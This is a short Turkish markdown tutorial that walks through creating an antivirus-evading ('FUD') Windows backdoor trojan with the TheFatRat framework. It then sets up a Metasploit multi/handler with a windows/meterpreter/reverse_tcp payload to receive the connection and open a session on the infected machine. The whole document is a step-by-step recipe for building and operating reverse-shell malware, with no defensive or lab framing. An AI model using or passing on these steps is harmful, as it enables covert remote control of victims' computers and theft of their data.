# Fatrat Kullanarak Trojan Oluşturma

#### 1.```fatrat``` ile framework'ü açıyoruz
#### 2. Yapmak istediğimiz işleme göre seçim yapıyoruz trojan oluşturmak için ```[02] Create Fud Backdoor with Fudwin 1.0``` seçiyoruz
#### 3. Trojanı yapıcağımız tool'u seçiyoruz ```[1] Hızlı [2] Yavaş fakat diğerine göre daha güçlü```
#### 4.```LHOST, LPORT``` giriyoruz
#### 5. Trojan adını seçiyoruz
#### 6. ```32bit/64bit``` seçiyoruz
#### 7. Trojan'ı oluşturuyoruz ve dinliyoruz

# Dinlemek için

#### 1.```msfconsole``` 
#### 2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
#### 3.```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
#### 4.```LHOST ve LPORT```'u değiştiriyoruz
#### 5.```exploit -j -z``` ile dinlemeye başlıyoruz 
#### 6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz



